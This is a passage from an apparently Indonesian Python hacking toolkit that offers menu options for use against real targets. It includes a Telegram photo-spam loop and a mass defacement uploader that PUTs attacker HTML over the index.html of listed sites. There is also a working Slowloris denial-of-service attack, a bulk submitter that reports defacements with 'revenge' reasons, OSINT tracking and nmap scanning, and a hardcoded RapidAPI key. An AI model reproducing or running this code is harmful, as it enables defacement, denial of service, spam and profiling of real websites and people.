⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]
        """)

    banner()
    TOKEN = input("[?] Masukkan BOT TOKEN: ")
    chat_ids_raw = input("[?] Masukkan Chat ID (pisahkan dengan koma): ")
    CHAT_IDS = [cid.strip() for cid in chat_ids_raw.split(",")]
    IMAGE_PATH = input("[?] Masukkan path foto (contoh: IMG-20250711-WA0096.jpg): ")
    CAPTION = input("[?] Masukkan caption/text: ")
    LOOP_COUNT = int(input("[?] Kirim berapa kali?: "))
    DELAY = int(input("[?] Delay antar kirim (detik): "))

    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

    print("\n[+] Mulai ngirim...\n")
    for i in range(LOOP_COUNT):
        for chat_id in CHAT_IDS:
            with open(IMAGE_PATH, "rb") as file:
                files = {"photo": file}
                data = {"chat_id": chat_id, "caption": CAPTION}
                response = requests.post(url, files=files, data=data)
            print(f"[{i+1}] ke {chat_id} Response: {response.json()}\n")
            print("Sukses kirim ke target.")
        time.sleep(DELAY)

#================================
# 9. DEFACEX - AUTO UPLOADER
@is_option
def defacex():
    try:
        import os
        import sys
        import time
        import random
        import os.path
        import requests
        import threading
    except ImportError:
        exit("install requests and try again ...(pip install requests")
    
    os.system("git pull")
    os.system("clear")
    
    red = "\033[31m"
    blue = "\033[34m"
    bold = "\033[1m"
    reset = "\033[0m"
    green = "\033[32m"
    yellow = "\033[33m"
    
    colors = [
        "\033[38;5;226m",
        "\033[38;5;227m", 
        "\033[38;5;229m",
        "\033[38;5;230m",
        "\033[38;5;190m",
        "\033[38;5;191m",
        "\033[38;5;220m",
        "\033[38;5;221m",
        "\033[38;5;142m",
        "\033[38;5;214m",
    ]
    
    color1, color2, color3, color4, color5 = random.sample(colors, 5)
    
    banner = f"""{Wh}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]
 
    """ + reset + blue
    
    def animate():
        text = "Uploading your script to websites..."
        while True:
            for i in range(len(text)):
                print(text[:i] + "_" + text[i+1:], end="\r")
                time.sleep(0.1)
    
    def eagle(tetew):
        ipt = ''
        if sys.version_info.major > 2:
            ipt = input(tetew)
        else:
            ipt = raw_input(tetew)
        return str(ipt)
    
    def white(script, target_file="targets.txt"):
        op = open(script, "r").read()
        with open(target_file, "r") as target:
            target = target.readlines()
        s = requests.Session()
        print(" ")
        print(green + bold + "[✓]\033[0m \033[34mUploading your script to %d website...." % (len(target)), end="", flush=True)
        print(" ")
        t = threading.Thread(target=animate)
        t.daemon = True
        t.start()
        
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
                else:
                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print; exit()
    
    def main(bn):
        print(bn)
        while True:
            try:
                print(green + '[Please put the deface script/html file in this same folder and type it\'s name below]' + reset + blue)
                print(' ')
                a = eagle(green + "[+]\033[0m \033[34mEnter your deface script's name \033[33m[eg: index.html]\033[0m \033[34m> ")
                if not os.path.isfile(a):
                    print(' ')
                    print(red + bold + "        file '%s' not found in this folder !" % (a))
                    print(" ")
                    continue
                else:
                    break
            except KeyboardInterrupt:
                print; exit()
        white(a)
    
    if __name__ == "__main__":
        main(banner)

#================================
# 11. SLOWLORIS DDoS ATTACK
@is_option
def slowloris_ddos():
    import argparse
    import logging
    import random
    import socket
    import time
    import ssl

    def send_line(self, line):
        line = f"{line}\r\n"
        self.send(line.encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")

    # Setup user agents
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

    def init_socket(ip, port, use_https, rand_useragent):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if use_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)

        s.connect((ip, port))

        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

        ua = user_agents[0]
        if rand_useragent:
            ua = random.choice(user_agents)

        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")
        s.send_header("Connection", "keep-alive")
        return s

    def slowloris_attack():
        print(f"{Wh}=== SLOWLORIS DDoS ATTACK ==={Gr}")
        
        host = input(f"{Wh}Enter target host: {Gr}")
        port = int(input(f"{Wh}Enter port (default 80): {Gr}") or "80")
        num_sockets = int(input(f"{Wh}Number of sockets (default 150): {Gr}") or "150")
        use_https = input(f"{Wh}Use HTTPS? (y/n): {Gr}").lower() == 'y'
        rand_useragent = input(f"{Wh}Randomize user agents? (y/n): {Gr}").lower() == 'y'
        sleep_time = int(input(f"{Wh}Sleep time between requests (seconds, default 15): {Gr}") or "15")
        
        print(f"\n{Wh}Starting Slowloris attack on {Gr}{host}:{port}{Wh}...")
        print(f"{Wh}Sockets: {Gr}{num_sockets}{Wh}, HTTPS: {Gr}{use_https}")
        print(f"{Wh}Press Ctrl+C to stop the attack\n")

        list_of_sockets = []
        
        # Add methods to socket
        setattr(socket.socket, "send_line", send_line)
        setattr(socket.socket, "send_header", send_header)
        
        if use_https:
            setattr(ssl.SSLSocket, "send_line", send_line)
            setattr(ssl.SSLSocket, "send_header", send_header)

        # Create initial sockets
        for i in range(num_sockets):
            try:
                s = init_socket(host, port, use_https, rand_useragent)
                list_of_sockets.append(s)
                if i % 10 == 0:
                    print(f"{Wh}Created {Gr}{i}{Wh} sockets...")
            except Exception as e:
                print(f"{Re}Failed to create socket {i}: {e}")
                break

        print(f"{Wh}Initial setup complete. {Gr}{len(list_of_sockets)}{Wh} sockets created.")
        print(f"{Wh}Starting attack...\n")

        try:
            while True:
                # Send keep-alive headers
                for s in list(list_of_sockets):
                    try:
                        s.send_header(f"X-{random.randint(1000, 9999)}", random.randint(1, 5000))
                    except (socket.error, OSError):
                        list_of_sockets.remove(s)
                        print(f"{Ye}Socket closed, remaining: {Gr}{len(list_of_sockets)}")

                # Replenish sockets
                diff = num_sockets - len(list_of_sockets)
                if diff > 0:
                    for _ in range(diff):
                        try:
                            s = init_socket(host, port, use_https, rand_useragent)
                            list_of_sockets.append(s)
                        except Exception:
                            break

                print(f"{Wh}Active sockets: {Gr}{len(list_of_sockets)}{Wh}/{Gr}{num_sockets}{Wh} - Sleeping {Gr}{sleep_time}{Wh} seconds")
                time.sleep(sleep_time)

        except KeyboardInterrupt:
            print(f"\n{Wh}Stopping Slowloris attack...")
            # Close all sockets
            for s in list_of_sockets:
                try:
                    s.close()
                except:
                    pass
            print(f"{Gr}Attack stopped. All sockets closed.")

        except Exception as e:
            print(f"{Re}Error during attack: {e}")

    slowloris_attack()
    
#================================
# 11. DEFACER.ID BULK SUBMITTER
@is_option
def defacerid_submitter():
    def print_banner():
        banner = f"""{Wh}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]

"""
        print(banner)

    def confirm_setting(prompt):
        while True:
            response = input(prompt).strip().lower()
            if response in {'yes', 'no'}:
                return response == 'yes'
            print("Only (yes/no)")

    def defacerid_bulk_submissions():
        notifier = input(f"{Wh}Enter notifier name: {Gr}")
        team = input(f"{Wh}Enter team name: {Gr}")
        
        # POC options
        print(f"\n{Wh}Select Proof of Concept:")
        poc_options = [
            "Known vulnerability (i.e. unpatched system)",
            "Undisclosed (new) vulnerability", 
            "Configuration / admin. mistake",
            "Brute force attack",
            "Social engineering",
            "Web Server intrusion",
            "SQL Injection",
            "Cross-Site Scripting",
            "Other"
        ]
        
        for i, option in enumerate(poc_options, 1):
            print(f"{Wh}[{Gr}{i}{Wh}] {option}")
        
        poc_choice = int(input(f"\n{Wh}Select POC (1-{len(poc_options)}): {Gr}"))
        poc = poc_options[poc_choice-1] if 1 <= poc_choice <= len(poc_options) else "Other"
        
        # Reason options
        print(f"\n{Wh}Select reason:")
        reason_options = [
            "Heh...just for fun!",
            "Revenge against that website",
            "Political reasons", 
            "As a challenge",
            "I just want to be the best defacer",
            "Patriotism",
            "Other"
        ]
        
        for i, option in enumerate(reason_options, 1):
            print(f"{Wh}[{Gr}{i}{Wh}] {option}")
        
        reason_choice = int(input(f"\n{Wh}Select reason (1-{len(reason_options)}): {Gr}"))
        reason = reason_options[reason_choice-1] if 1 <= reason_choice <= len(reason_options) else "Other"

        file_path = input(f"\n{Wh}Enter path to URLs file: {Gr}")
        
        if not os.path.isfile(file_path):
            print(f"{Re}Error: File '{file_path}' not found!")
            return

        if not confirm_setting(f'{Wh}Are you sure about these settings? (yes/no): {Gr}'):
            print(f"{Ye}Operation cancelled.")
            return

        with open(file_path, 'r') as file:
            urls = file.readlines()

        print(f"\n{Wh}Submitting {len(urls)} URLs to Defacer.ID...\n")

        for url in urls:
            url = url.strip()
            if not url:
                continue
                
            data = {
                "notifier": notifier,
                "team": team,
                "url": url,
                "poc": poc,
                "reason": reason
            }
            
            try:
                response = requests.post("https://api.defacer.id/notify", json=data, timeout=30)
                
                if response.status_code == 200:
                    try:
                        response_json = response.json()
                        message = response_json.get('message', 'No message found')
                        print(f"{Gr}[SUCCESS] {Wh}{url} => {Gr}{message}")
                    except json.JSONDecodeError:
                        print(f"{Ye}[WARNING] {Wh}{url} => {Ye}Invalid JSON response")
                else:
                    print(f"{Re}[ERROR] {Wh}{url} => {Re}HTTP {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                print(f"{Re}[ERROR] {Wh}{url} => {Re}Request failed: {str(e)}")
            
            time.sleep(1)  # Delay to avoid rate limiting

    print_banner()
    defacerid_bulk_submissions()
    
#================================
# 12. REDEYE FRAMEWORK
@is_option
def redeye_framework():
    import json
    import requests
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone
    
    # Plugin functions
    def TrackSocial(username):
        social_media = [
            {"url": "https://www.facebook.com/{}", "name": "Facebook"},
            {"url": "https://www.twitter.com/{}", "name": "Twitter"},
            {"url": "https://www.instagram.com/{}", "name": "Instagram"},
            {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
            {"url": "https://www.github.com/{}", "name": "GitHub"},
            {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
            {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
            {"url": "https://www.youtube.com/@{}", "name": "YouTube"},
            {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
            {"url": "https://www.behance.net/{}", "name": "Behance"},
            {"url": "https://www.medium.com/@{}", "name": "Medium"},
            {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
            {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
            {"url": "https://www.periscope.tv/{}", "name": "Periscope"},
            {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
            {"url": "https://www.dribbble.com/{}", "name": "Dribbble"},
            {"url": "https://www.stumbleupon.com/stumbler/{}", "name": "StumbleUpon"},
            {"url": "https://www.ello.co/{}", "name": "Ello"},
            {"url": "https://www.producthunt.com/@{}", "name": "Product Hunt"},
            {"url": "https://www.telegram.me/{}", "name": "Telegram"},
            {"url": "https://www.weheartit.com/{}", "name": "We Heart It"}
        ]

        results = []
        for platform in social_media:
            url = platform["url"].format(username)
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    results.append({
                        "platform": platform["name"],
                        "url": url,
                        "status": "Found"
                    })
                else:
                    results.append({
                        "platform": platform["name"],
                        "url": url,
                        "status": "Not Found"
                    })
            except:
                results.append({
                    "platform": platform["name"],
                    "url": url,
                    "status": "Error"
                })
        return json.dumps(results, indent=4)

    def LookupCarrier(phone):
        try:
            parsed_number = phonenumbers.parse(str(phone), None)
            default_region = phonenumbers.region_code_for_number(parsed_number)
            jenis_provider = carrier.name_for_number(parsed_number, "en")
            location = geocoder.description_for_number(parsed_number, "id")
            is_valid_number = phonenumbers.is_valid_number(parsed_number)
            is_possible_number = phonenumbers.is_possible_number(parsed_number)
            formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(parsed_number, default_region, with_formatting=True)
            timezone1 = timezone.time_zones_for_number(parsed_number)
            timezoneF = ', '.join(timezone1)
            
            phone_info = {
                "status": "Success",
                "Location": location,
                "Region Code": default_region,
                "Timezone": timezoneF,
                "Operator": jenis_provider,
                "Valid Number": is_valid_number,
                "Possible Number": is_possible_number,
                "International Format": formatted_number,
                "Mobile Format": formatted_number_for_mobile,
                "Original Number": parsed_number.national_number,
                "E164 Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164),
                "Country Code": parsed_number.country_code,
                "Local Number": parsed_number.national_number
            }
            return json.dumps(phone_info, indent=4)
        except Exception as e:
            return json.dumps({"error": str(e)}, indent=4)

    def WhoisIp(ip):
        try:
            url = f"http://ipwho.is/{ip}"
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    return json.dumps(data, indent=4)  
                else:
                    return json.dumps({"error": "Invalid IP address"}, indent=4)
            else:
                return json.dumps({"error": f"HTTP Error: {response.status_code}"}, indent=4)
        except Exception as e:
            return json.dumps({"error": str(e)}, indent=4)

    def NmapScan(target):
        try:
            import nmap
            nm = nmap.PortScanner()
            nm.scan(target, arguments='-F')  # Fast scan
            scan_data = {}
            for host in nm.all_hosts():
                scan_data['host'] = host
                scan_data['state'] = nm[host].state()
                ports = []
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        port_info = {
                            'port': port,
                            'state': nm[host][proto][port]['state'],
                            'name': nm[host][proto][port]['name']
                        }
                        ports.append(port_info)
                scan_data['ports'] = ports
            return json.dumps(scan_data, indent=4)
        except ImportError:
            return json.dumps({"error": "nmap module not installed. Run: pip install python-nmap"}, indent=4)
        except Exception as e:
            return json.dumps({"error": str(e)}, indent=4)

    # RedEye Menu
    banner = f"""             
{Fore.RED} _____       _    {Style.RESET_ALL} _____          
{Fore.RED}| __  |___ _| |___{Style.RESET_ALL}|   __|_ _ ___  1.0.1#github
{Fore.RED}|    -| -_| . |- _{Style.RESET_ALL}|   __| | | -_| https://t.me/adjidev
{Fore.RED}|__|__|___|___|___{Style.RESET_ALL}|_____|_  |___| 
{Fore.RED}                  {Style.RESET_ALL}      |___|    
"""

    menu = f"""
{Wh}========== {Gr}REDEYE FRAMEWORK {Wh}=========={Gr}

{Wh}[{Gr}1{Wh}] {Gr}NIK PARSER
{Wh}[{Gr}2{Wh}] {Gr}PHONE NUMBER LOOKUP        
{Wh}[{Gr}3{Wh}] {Gr}TRACK USERNAME             
{Wh}[{Gr}4{Wh}] {Gr}WHOIS LOOKUP
{Wh}[{Gr}5{Wh}] {Gr}NMAP SCAN
{Wh}[{Gr}0{Wh}] {Gr}BACK TO MAIN MENU
"""

    def ClearScreen():
        os.system('cls' if os.name == 'nt' else 'clear')

    ClearScreen()
    print(banner)
    print(menu)
    
    while True:
        try:
            choice = input(f"{Wh}\nredzeye@2024~# {Gr}")
            
            if choice == "1":
                nik = input(f"{Wh}Type a valid NIK\n~# {Gr}")
                print(f"{Wh}\n[!] NIK Parser feature requires external node.js script")
                print(f"{Wh}Run manually: node plugins/nik.js -n {nik}")
                input(f"\n{Wh}Press enter to continue...")
                redeye_framework()
                
            elif choice == "2":
                nomer = input(f"{Wh}Type a valid phone number (ex: +628123456789)\n~# {Gr}")
                hasilnya = LookupCarrier(phone=nomer)
                print(f"\n{Gr}{hasilnya}")
                input(f"\n{Wh}Press enter to continue...")
                redeye_framework()
                
            elif choice == "3":
                username = input(f"{Wh}Type a username to track\n~# {Gr}")
                hasilnya = TrackSocial(username=username)
                print(f"\n{Gr}{hasilnya}")
                input(f"\n{Wh}Press enter to continue...")
                redeye_framework()
                
            elif choice == "4":
                ip = input(f"{Wh}Type a valid IP address or domain\n~# {Gr}")
                hasilnya = WhoisIp(ip=ip)
                print(f"\n{Gr}{hasilnya}")
                input(f"\n{Wh}Press enter to continue...")
                redeye_framework()
                
            elif choice == "5":
                target = input(f"{Wh}Type a valid IP address or domain to scan\n~# {Gr}")
                hasilnya = NmapScan(target=target)
                print(f"\n{Gr}{hasilnya}")
                input(f"\n{Wh}Press enter to continue...")
                redeye_framework()
                
            elif choice == "0":
                print(f"{Wh}\n[ {Gr}+ {Wh}] {Gr}Returning to main menu...")
                time.sleep(1)
                main()
                
            else:
                print(f"{Re}[!] Invalid option! Please try again.")
                
        except KeyboardInterrupt:
            print(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Returning to main menu...")
            time.sleep(1)
            main()
        except Exception as e:
            print(f"{Re}[!] Error: {e}")
            input(f"\n{Wh}Press enter to continue...")
            redeye_framework()   

#================================
# 13. TIKTOK INFO TRACKER
@is_option
def tiktok_info_tracker():
    import requests
    import json

    def get_tiktok_info():
        print(f"{Wh}=== TIKTOK INFO TRACKER ===")
        username = input(f"{Wh}\n[?] Enter TikTok username: {Gr}")
        
        url = "https://tiktok-scraper7.p.rapidapi.com/user/info"
        querystring = {"unique_id": username}
        headers = {
            "X-RapidAPI-Key": "1a1537d560mshbad07893adb9308p1f0fb2jsn3484472e8f81",
            "X-RapidAPI-Host": "tiktok-scraper7.p.rapidapi.com"
        }
        
        try:
            print(f"{Wh}[{Gr}*{Wh}] Fetching TikTok info for {Gr}{username}...")
            response = requests.get(url, headers=headers, params=querystring, timeout=30)
            output = response.json()
            
            if 'data' in output and 'user' in output['data']:
                user_data = output['data']['user']
                stats_data = output['data']['stats']
                
                print(f"\n{Wh}=== TIKTOK USER INFO ===")
